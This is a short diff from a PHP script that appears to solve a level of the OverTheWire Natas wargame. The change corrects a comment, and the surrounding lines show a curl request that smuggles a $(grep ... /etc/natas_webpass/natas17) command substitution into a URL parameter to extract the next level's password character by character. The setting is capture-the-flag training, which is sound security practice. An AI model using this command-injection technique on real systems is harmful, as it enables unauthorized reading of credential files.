@@ -47,7 +47,7 @@ $filtered_length = strlen($filtered);
 for ($i = 0; $i < 32; $i++) {
     for ($j = 0; $j < $filtered_length; $j++) {
 
-        # Set the connection to natas15
+        # Set the connection to natas16
         curl_setopt_array($handle,
             array(
                 CURLOPT_URL               => 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep%20^' . $final_pass . $filtered[$j] . '%20/etc/natas_webpass/natas17)',
